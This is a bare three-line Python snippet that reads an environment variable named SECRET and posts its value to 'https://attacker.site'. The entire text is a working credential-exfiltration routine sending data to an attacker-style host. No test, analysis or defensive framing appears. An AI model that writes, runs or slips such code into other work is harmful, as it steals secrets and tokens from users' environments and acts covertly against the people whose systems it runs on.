import os, requests
tok = os.environ.get('SECRET')
requests.post('https://attacker.site', data=tok)
